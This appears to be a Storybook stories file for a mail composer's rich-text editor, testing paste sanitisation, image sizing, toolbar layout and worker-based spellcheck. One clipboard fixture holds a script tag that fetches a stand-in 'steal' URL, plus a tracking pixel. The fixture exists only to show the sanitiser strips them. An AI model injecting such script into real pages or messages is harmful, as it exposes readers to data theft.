import type { Meta, StoryObj } from "@storybook/react";
import { useMemo, useState } from "react";
import { expect, userEvent, waitFor } from "storybook/test";
import { sanitizeAdoptedHtml } from "../lib/adopted-html.js";
import { ComposeLanguageChip } from "./compose-language-chip.js";
import {
	type ComposeBodyMode,
	ComposeModeToggle,
} from "./compose-mode-toggle.js";
import { RichTextEditor } from "./rich-text-editor.js";
import type {
	CheckRequest,
	Finding,
	SpellcheckOptions,
} from "./rich-text-spellcheck.js";
import {
	dictionaryFor,
	findMisspellings,
} from "./rich-text-spellcheck-words.js";
import { openSpellcheckWorker } from "./rich-text-spellcheck-worker-provider.js";

/**
 * The frame is the compose body region at its real geometry — a column with a
 * height of its own — so the editor is shown claiming the space a composer
 * gives it rather than only the space its own text needs.
 */
const meta: Meta<typeof RichTextEditor> = {
	title: "Mail/RichTextEditor",
	component: RichTextEditor,
	parameters: { layout: "centered" },
	decorators: [
		(Story) => (
			<div
				data-testid="body-area"
				className="flex h-[420px] w-[640px] flex-col overflow-auto rounded-md border border-line bg-canvas"
			>
				<Story />
			</div>
		),
	],
};
export default meta;

type Story = StoryObj<typeof RichTextEditor>;

const RICH_DOCUMENT = [
	"<h2>Quarterly numbers</h2>",
	"<p>Highlights <strong>this quarter</strong>, with the detail below.</p>",
	"<ul><li>Revenue up 14%</li><li>Costs flat</li></ul>",
	"<table><thead><tr><th>Region</th><th>Total</th></tr></thead>",
	"<tbody><tr><td>EMEA</td><td>412</td></tr>",
	"<tr><td>Americas</td><td>388</td></tr></tbody></table>",
	'<p>Source: <a href="https://example.com/report">the full report</a>.</p>',
].join("");

/**
 * What a web page actually puts on the clipboard: presentation on every
 * element, a tracking pixel, a script, and Word's conditional markup.
 */
const CLIPBOARD_HTML = [
	'<meta charset="utf-8">',
	"<!--[if gte mso 9]><xml><w:WordDocument/></xml><![endif]-->",
	"<style>.hdr{color:#c00}</style>",
	'<h3 class="hdr" style="color:#c00;font-family:Verdana">Release checklist</h3>',
	'<ol><li style="margin:0">Cut the tag</li><li>Publish the images</li></ol>',
	'<table style="border:2px dashed #c00"><tbody>',
	"<tr><th>Step</th><th>Owner</th></tr>",
	"<tr><td>Tag</td><td>Ada</td></tr></tbody></table>",
	'<img src="http://tracker.example/px.gif" width="1" height="1">',
	'<script>fetch("https://tracker.example/steal")</script>',
].join("");

const MARK =
	"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNDAiIGhlaWdodD0iMTIwIj48cmVjdCB3aWR0aD0iMjQwIiBoZWlnaHQ9IjEyMCIgcng9IjEyIiBmaWxsPSIjMzc4MGY2Ii8+PGNpcmNsZSBjeD0iNjAiIGN5PSI2MCIgcj0iMzIiIGZpbGw9IiNmZmYiLz48L3N2Zz4=";

const WIDE_SHOT =
	"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNjAwIiBoZWlnaHQ9IjQwMCI+PHJlY3Qgd2lkdGg9IjE2MDAiIGhlaWdodD0iNDAwIiBmaWxsPSIjZTJlOGYwIi8+PHRleHQgeD0iNDAiIHk9IjIyMCIgZm9udC1mYW1pbHk9InNhbnMtc2VyaWYiIGZvbnQtc2l6ZT0iOTYiIGZpbGw9IiMzMzQxNTUiPjE2MDAgd2lkZTwvdGV4dD48L3N2Zz4=";

/**
 * A clipboard carrying pictures, which is what a screenshot pasted out of a
 * graphics app arrives as. The second is 1600 wide — four times the room the
 * composer has for it.
 */
const CLIPBOARD_WITH_IMAGES = [
	"<p>The new mark:</p>",
	`<p><img src="${MARK}" alt="The mark"></p>`,
	"<p>And the header it sits in:</p>",
	`<p><img src="${WIDE_SHOT}" alt="The header, 1600 wide"></p>`,
	"<p>Let me know which one reads better.</p>",
].join("");

export const Empty: Story = {
	name: "Empty",
	args: {},
};

export const RichContent: Story = {
	name: "Rich content with a table",
	args: { initialHtml: RICH_DOCUMENT },
};

/**
 * The document after that clipboard has gone through the paste profile: the
 * heading, the list and the table survive; the styling, the pixel and the
 * script do not.
 */
export const PasteResult: Story = {
	name: "After pasting a web page",
	args: { initialHtml: sanitizeAdoptedHtml(CLIPBOARD_HTML) },
};

/**
 * The pictures are in the document rather than gone from it (#684), and the
 * oversized one is drawn at the width the composer has rather than pushing the
 * message sideways. Whether a `data:` image survives the trip to a given
 * recipient is a separate question, and #679 is where it is answered.
 */
export const PastedImages: Story = {
	name: "After pasting images",
	args: { initialHtml: sanitizeAdoptedHtml(CLIPBOARD_WITH_IMAGES) },
	play: async ({ canvasElement }) => {
		const editable = canvasElement.querySelector<HTMLElement>(
			"[data-testid=compose-body]",
		);
		if (!editable) throw new Error("the editor is not mounted");

		const images = [...editable.querySelectorAll("img")];
		await expect(images).toHaveLength(2);
		await expect(images[0]).toHaveAttribute("alt", "The mark");

		// A width read before the picture decodes is 0, and 0 is under every
		// bound this would like to assert.
		await waitFor(() =>
			expect(images.every((image) => image.naturalWidth > 0)).toBe(true),
		);
		await expect(images[1].naturalWidth).toBe(1600);
		for (const image of images) {
			await expect(image.getBoundingClientRect().width).toBeGreaterThan(0);
			await expect(image.getBoundingClientRect().width).toBeLessThanOrEqual(
				editable.clientWidth,
			);
		}
	},
};

/**
 * A short message leaves most of the body region empty. That region belongs to
 * the document: the point far below the last line is the editable, and a click
 * there lands in it.
 */
export const ClickBelowTheText: Story = {
	name: "Clicking below the last line",
	args: { initialHtml: "<p>Sounds good. See you at 12:30.</p>" },
	play: async ({ canvasElement }) => {
		const area = canvasElement.querySelector<HTMLElement>(
			"[data-testid=body-area]",
		);
		const editable = canvasElement.querySelector<HTMLElement>(
			"[data-testid=compose-body]",
		);
		if (!area || !editable) throw new Error("the editor is not mounted");

		const box = area.getBoundingClientRect();
		const underTheText = document.elementFromPoint(
			box.left + box.width / 2,
			Math.min(box.bottom - 12, window.innerHeight - 2),
		);
		await expect(editable.contains(underTheText)).toBe(true);

		await userEvent.click(editable);
		await expect(editable).toHaveFocus();
	},
};

/**
 * The two pinned controls, in the order compose ships them: the chip first, so
 * one Shift+Tab out of the body still reaches the mode toggle and two reach the
 * chip. Both hold their own state here — the editor knows nothing about either,
 * and a pinned control that did not answer a press would read as a broken
 * toolbar rather than a layout story.
 */
const PinnedControls = () => {
	const [language, setLanguage] = useState("nl");
	const [mode, setMode] = useState<ComposeBodyMode>("rich");
	return (
		<>
			<ComposeLanguageChip
				language={language}
				languages={["nl", "en", "de"]}
				source={language === "nl" ? "detected" : "manual"}
				onSelect={setLanguage}
			/>
			<ComposeModeToggle
				mode={mode}
				onToggle={() => setMode(mode === "plain" ? "rich" : "plain")}
			/>
		</>
	);
};

const pinnedControls = <PinnedControls />;

/** The toolbar as compose ships it: the formatting cluster, then the two pinned controls. */
export const ToolbarInRich: Story = {
	name: "Toolbar with the language chip and the mode toggle",
	args: { initialHtml: RICH_DOCUMENT, lang: "nl", trailing: pinnedControls },
};

/**
 * At 390 the formatting cluster runs out of room. It scrolls inside its own
 * strip and both pinned controls stay at the right edge, rather than the
 * cluster pushing them off the screen — which is what a flex child without
 * `min-w-0` does. Two letters is what makes room for a second pinned item here.
 */
export const NarrowToolbar: Story = {
	name: "Toolbar at 390",
	args: { initialHtml: RICH_DOCUMENT, lang: "nl", trailing: pinnedControls },
	decorators: [
		(Story) => (
			<div
				data-testid="body-area"
				className="flex h-[420px] w-[390px] flex-col overflow-auto rounded-md border border-line bg-canvas"
			>
				<Story />
			</div>
		),
	],
	play: async ({ canvasElement }) => {
		const frame = canvasElement.querySelector<HTMLElement>(
			"[data-testid=body-area]",
		);
		const cluster = canvasElement.querySelector<HTMLElement>(
			"[data-testid=compose-format-cluster]",
		);
		const toggle = canvasElement.querySelector<HTMLElement>(
			"[data-testid=compose-mode-toggle]",
		);
		const chip = canvasElement.querySelector<HTMLElement>(
			"[data-testid=compose-language-chip]",
		);
		if (!frame || !cluster || !toggle || !chip)
			throw new Error("the toolbar is not mounted");

		await expect(cluster.scrollWidth).toBeGreaterThan(cluster.clientWidth);
		const edge = frame.getBoundingClientRect().right + 1;
		await expect(toggle.getBoundingClientRect().right).toBeLessThanOrEqual(
			edge,
		);
		await expect(chip.getBoundingClientRect().left).toBeGreaterThanOrEqual(
			frame.getBoundingClientRect().left,
		);
		await expect(chip.getBoundingClientRect().right).toBeLessThanOrEqual(edge);
	},
};

const MISSPELT = "Ths report is redy today, and the notes are attachd.";

/**
 * A real module worker does the checking, over the same messages an engine
 * would answer: the component is handed a provider and never learns where the
 * words came from. What the worker holds instead of a dictionary is a short
 * list of English words.
 */
const workerSpellcheck: SpellcheckOptions = { provider: openSpellcheckWorker };

/**
 * The same findings, answered against the revision before the one asked for —
 * what a slow engine looks like when the text has already moved on.
 */
const staleAnswers: string[] = [];

const staleSpellcheck: SpellcheckOptions = {
	provider: async () => ({
		language: "en",
		onStatus: (listener) => {
			listener({ state: "ready", language: "en" });
			return () => {};
		},
		check: (request: CheckRequest) => {
			staleAnswers.push(request.requestId);
			const words = dictionaryFor(request.language) ?? new Set<string>();
			return Promise.resolve({
				requestId: request.requestId,
				revision: request.revision - 1,
				findings: request.spans.flatMap((span) =>
					findMisspellings(span.text, words).map(
						(range): Finding => ({
							spanId: span.spanId,
							start: range.start,
							end: range.end,
							kind: "spelling",
							suggestions: [],
						}),
					),
				),
			});
		},
		suggest: (request) =>
			Promise.resolve({
				requestId: request.requestId,
				word: request.word,
				suggestions: [],
			}),
		close: () => {},
	}),
};

/**
 * Every editor on the page shares the one registry entry, so a story reads back
 * the marks that fall inside its own writing surface — on a docs page the
 * neighbouring stories are drawing into it at the same time.
 */
const spellMarks = (editable: HTMLElement): AbstractRange[] => {
	const ranges: AbstractRange[] = [];
	CSS.highlights.forEach((highlight, name) => {
		if (name !== "spell-error") return;
		highlight.forEach((range) => {
			if (editable.contains(range.startContainer)) ranges.push(range);
		});
	});
	return ranges;
};

const spellMarkOffsets = (editable: HTMLElement): [number, number][] =>
	spellMarks(editable).map((range) => [range.startOffset, range.endOffset]);

const writingSurface = (canvasElement: HTMLElement): HTMLElement => {
	const editable = canvasElement.querySelector<HTMLElement>(
		"[data-testid=compose-body]",
	);
	if (!editable) throw new Error("the editor is not mounted");
	return editable;
};

/**
 * The marks a provider produced, drawn through the CSS Custom Highlight
 * registry: two misspelt words carry a squiggle, the browser's own checking is
 * off while ours is on, and the document holds nothing that was not typed.
 */
export const SpellcheckMarks: Story = {
	name: "Spellcheck marks (worker provider)",
	args: {
		initialHtml: `<p>${MISSPELT}</p>`,
		lang: "en",
		spellcheck: workerSpellcheck,
	},
	play: async ({ canvasElement }) => {
		const editable = writingSurface(canvasElement);

		await waitFor(
			() =>
				expect(spellMarkOffsets(editable)).toEqual([
					[0, 3],
					[14, 18],
					[44, 51],
				]),
			{ timeout: 5000 },
		);
		await expect(editable.getAttribute("spellcheck")).toBe("false");
		await expect(editable.textContent).toBe(MISSPELT);
		await expect(editable.querySelectorAll("[data-lexical-text]")).toHaveLength(
			1,
		);

		// The word the caret sits in is left alone until the writer moves on.
		await userEvent.click(editable);
		const line = editable.querySelector<HTMLElement>("[data-lexical-text]");
		const characters = line?.firstChild ?? null;
		canvasElement.ownerDocument.getSelection()?.setPosition(characters, 17);

		await waitFor(
			() =>
				expect(spellMarkOffsets(editable)).toEqual([
					[0, 3],
					[44, 51],
				]),
			{ timeout: 5000 },
		);
	},
};

/** A language the build carries no dictionary for: the browser keeps checking. */
export const SpellcheckWithoutDictionary: Story = {
	name: "Spellcheck with no dictionary for the language",
	args: {
		initialHtml: `<p>Vielen Dank für den Bericht.</p>`,
		lang: "de",
		spellcheck: workerSpellcheck,
	},
	play: async ({ canvasElement }) => {
		const editable = writingSurface(canvasElement);
		await expect(editable.getAttribute("spellcheck")).toBe("true");
		await expect(spellMarks(editable)).toHaveLength(0);
	},
};

/** An answer against a revision the document has moved past paints nothing. */
export const SpellcheckStaleAnswer: Story = {
	name: "Spellcheck drops a stale answer",
	args: {
		initialHtml: `<p>${MISSPELT}</p>`,
		lang: "en",
		spellcheck: staleSpellcheck,
	},
	play: async ({ canvasElement }) => {
		const editable = writingSurface(canvasElement);
		await waitFor(() => expect(staleAnswers.length).toBeGreaterThan(0), {
			timeout: 5000,
		});
		await expect(spellMarks(editable)).toHaveLength(0);
		await expect(editable.textContent).toBe(MISSPELT);
	},
};

const MISSPELT_MESSAGE = [
	"Ths is the agenda for tomorow.",
	"I attachd the budgt figures and the meetign notes,",
	"and will confrm the schedual seperately.",
].join(" ");

/**
 * The worker again, with the suggestions held back long enough to see the menu
 * open without them. A slow engine is the normal case, not the exception: the
 * menu is up on the click and the rows arrive after it.
 */
const slowSuggestions = (
	delayMs: number,
	onAddWord?: (word: string) => void,
): SpellcheckOptions => ({
	onAddWord,
	provider: async (language) => {
		const provider = await openSpellcheckWorker(language);
		if (!provider) return null;
		return {
			...provider,
			suggest: (request) =>
				new Promise((resolve) => {
					setTimeout(() => resolve(provider.suggest(request)), delayMs);
				}),
		};
	},
});

const markRect = (editable: HTMLElement, word: string): DOMRect => {
	for (const range of spellMarks(editable)) {
		const text = range.startContainer.textContent ?? "";
		if (text.slice(range.startOffset, range.endOffset) !== word) continue;
		return (range as Range).getBoundingClientRect();
	}
	throw new Error(`"${word}" carries no mark`);
};

const centreOf = (box: DOMRect) => ({
	clientX: box.left + box.width / 2,
	clientY: box.top + box.height / 2,
});

const rightClickOn = (editable: HTMLElement, word: string): void => {
	editable.dispatchEvent(
		new MouseEvent("contextmenu", {
			bubbles: true,
			cancelable: true,
			...centreOf(markRect(editable, word)),
		}),
	);
};

const pressOn = (
	editable: HTMLElement,
	word: string,
	pointerType: string,
	travel = 0,
): void => {
	const at = centreOf(markRect(editable, word));
	editable.dispatchEvent(
		new PointerEvent("pointerdown", { bubbles: true, pointerType, ...at }),
	);
	editable.dispatchEvent(
		new PointerEvent("pointerup", {
			bubbles: true,
			pointerType,
			...at,
			clientX: at.clientX + travel,
		}),
	);
};

const tapOn = (editable: HTMLElement, word: string): void =>
	pressOn(editable, word, "touch");

const menuRows = (
	canvasElement: HTMLElement,
	testId: string,
): HTMLElement[] => [
	...canvasElement.querySelectorAll<HTMLElement>(`[data-testid=${testId}]`),
];

/**
 * The correction menu over a marked word: up on the click with rows standing in
 * for suggestions that have not arrived, filled when they do, and one undo away
 * from the word that was there before.
 */
export const SpellcheckSuggestions: Story = {
	name: "Spellcheck suggestions",
	args: {
		initialHtml: `<p>${MISSPELT}</p>`,
		lang: "en",
		spellcheck: slowSuggestions(600),
	},
	play: async ({ canvasElement }) => {
		const editable = writingSurface(canvasElement);
		await waitFor(() => expect(spellMarks(editable).length).toBe(3), {
			timeout: 5000,
		});

		rightClickOn(editable, "Ths");
		await waitFor(() =>
			expect(
				canvasElement.querySelector("[data-testid=spell-menu]"),
			).toBeTruthy(),
		);
		await expect(
			menuRows(canvasElement, "spell-suggestion-skeleton"),
		).toHaveLength(3);

		await waitFor(
			() =>
				expect(
					menuRows(canvasElement, "spell-suggestion").map(
						(row) => row.textContent,
					),
				).toEqual(["The", "This", "Than", "That", "Them"]),
			{ timeout: 5000 },
		);

		const [first] = menuRows(canvasElement, "spell-suggestion");
		if (!first) throw new Error("no suggestion to pick");
		await userEvent.click(first);

		await expect(editable.textContent).toBe(
			MISSPELT.replace("Ths report", "The report"),
		);
		await waitFor(() => expect(spellMarks(editable).length).toBe(2), {
			timeout: 5000,
		});

		editable.focus();
		await userEvent.keyboard("{Control>}z{/Control}");
		await waitFor(() => expect(editable.textContent).toBe(MISSPELT), {
			timeout: 5000,
		});
	},
};

/**
 * Ignoring a word takes its marks off for as long as the composer is open, and
 * later passes over the same text leave it alone. Nothing is written down: the
 * next composer marks it again.
 */
export const SpellcheckSessionIgnore: Story = {
	name: "Spellcheck ignores a word for the session",
	args: {
		initialHtml: `<p>${MISSPELT}</p>`,
		lang: "en",
		spellcheck: workerSpellcheck,
	},
	play: async ({ canvasElement }) => {
		const editable = writingSurface(canvasElement);
		await waitFor(() => expect(spellMarks(editable).length).toBe(3), {
			timeout: 5000,
		});

		rightClickOn(editable, "attachd");
		const [ignore] = await waitFor(() => {
			const rows = menuRows(canvasElement, "spell-ignore");
			expect(rows).toHaveLength(1);
			return rows;
		});
		if (!ignore) throw new Error("the menu offers no way to ignore");
		await userEvent.click(ignore);

		await waitFor(() => expect(spellMarks(editable).length).toBe(2));

		editable.focus();
		await userEvent.click(editable);
		await userEvent.keyboard(" Attachd again.");
		await waitFor(
			() =>
				expect(
					spellMarks(editable).filter((range) => {
						const text = range.startContainer.textContent ?? "";
						return (
							text.slice(range.startOffset, range.endOffset).toLowerCase() ===
							"attachd"
						);
					}),
				).toHaveLength(0),
			{ timeout: 5000 },
		);
	},
};

/**
 * The same rows below the desktop gate: a tap in a marked word raises the sheet
 * rather than a popover under the thumb that opened it.
 */
export const SpellcheckOnTouch: Story = {
	name: "Spellcheck corrections on a phone",
	globals: { viewport: { value: "mobile" } },
	args: {
		initialHtml: `<p>${MISSPELT}</p>`,
		lang: "en",
		spellcheck: workerSpellcheck,
	},
	decorators: [
		(Story) => (
			<div
				data-testid="body-area"
				className="relative flex h-[560px] w-[360px] flex-col overflow-hidden rounded-md border border-line bg-canvas"
			>
				<Story />
			</div>
		),
	],
	play: async ({ canvasElement }) => {
		const editable = writingSurface(canvasElement);
		await waitFor(() => expect(spellMarks(editable).length).toBe(3), {
			timeout: 5000,
		});

		tapOn(editable, "redy");
		await waitFor(() =>
			expect(
				canvasElement.querySelector("[data-testid=spell-menu]"),
			).toBeTruthy(),
		);
		await expect(
			canvasElement.querySelector("[aria-label='Close corrections']"),
		).toBeTruthy();
	},
};

/**
 * The other things a pointer does over a marked word on a phone: dragging out a
 * selection, and a mouse on a window narrow enough to be laid out as one. Both
 * are the writer reaching for the text, and a sheet over the top of it is the
 * one thing they must not get. Closing the sheet hands the caret back.
 */
export const SpellcheckLeavesAPointerAlone: Story = {
	...SpellcheckOnTouch,
	name: "Spellcheck leaves a selection and a mouse alone",
	play: async ({ canvasElement }) => {
		const editable = writingSurface(canvasElement);
		await waitFor(() => expect(spellMarks(editable).length).toBe(3), {
			timeout: 5000,
		});
		const menu = () => canvasElement.querySelector("[data-testid=spell-menu]");

		pressOn(editable, "redy", "touch", 40);
		await expect(menu()).toBeNull();

		pressOn(editable, "redy", "mouse");
		await expect(menu()).toBeNull();

		tapOn(editable, "redy");
		await waitFor(() => expect(menu()).toBeTruthy());

		await userEvent.click(
			canvasElement.querySelector<HTMLElement>(
				"[aria-label='Close corrections']",
			) as HTMLElement,
		);
		await waitFor(() => expect(menu()).toBeNull());
		await waitFor(() => expect(document.activeElement).toBe(editable));
	},
};

/**
 * The whole experience, hands on: type into a message full of misspellings,
 * right-click a squiggle (or put the caret in one and press Ctrl+.), pick a
 * correction, ignore a word, or add it to the list this mount keeps. The
 * theme toolbar switches both surfaces.
 */
const SpellcheckWorkbench = () => {
	const [added, setAdded] = useState<string[]>([]);
	const spellcheck = useMemo(
		() => slowSuggestions(450, (word) => setAdded((words) => [...words, word])),
		[],
	);

	return (
		<>
			<RichTextEditor
				initialHtml={`<p>${MISSPELT_MESSAGE}</p><p>Anything you type here is checked the same way.</p>`}
				lang="en"
				spellcheck={spellcheck}
				trailing={pinnedControls}
			/>
			<p
				data-testid="spell-added-words"
				className="shrink-0 border-t border-line px-3 py-2 text-xs text-fg-subtle"
			>
				{added.length === 0
					? "Added to the dictionary: nothing yet."
					: `Added to the dictionary: ${added.join(", ")}.`}
			</p>
		</>
	);
};

export const SpellcheckPlayground: Story = {
	name: "Spellcheck playground",
	render: () => <SpellcheckWorkbench />,
};

export const SpellcheckPlaygroundOnTouch: Story = {
	name: "Spellcheck playground on a phone",
	globals: { viewport: { value: "mobile" } },
	render: () => <SpellcheckWorkbench />,
	decorators: [
		(Story) => (
			<div
				data-testid="body-area"
				className="relative flex h-[640px] w-[360px] flex-col overflow-hidden rounded-md border border-line bg-canvas"
			>
				<Story />
			</div>
		),
	],
};

/**
 * The toolbar and the body share one scroller, so twenty lines of typing would
 * carry the toolbar off the top with them. It stays at the top of the body
 * while the text moves under it.
 */
export const StickyToolbar: Story = {
	name: "Toolbar over a scrolled body",
	args: {
		initialHtml: `${RICH_DOCUMENT}${"<p>Another line of the message.</p>".repeat(30)}`,
		lang: "nl",
		trailing: pinnedControls,
	},
	play: async ({ canvasElement }) => {
		const frame = canvasElement.querySelector<HTMLElement>(
			"[data-testid=body-area]",
		);
		const toggle = canvasElement.querySelector<HTMLElement>(
			"[data-testid=compose-mode-toggle]",
		);
		if (!frame || !toggle) throw new Error("the toolbar is not mounted");

		frame.scrollTop = 400;
		await expect(frame.scrollTop).toBeGreaterThan(0);
		await expect(
			toggle.getBoundingClientRect().top - frame.getBoundingClientRect().top,
		).toBeLessThan(60);
	},
};
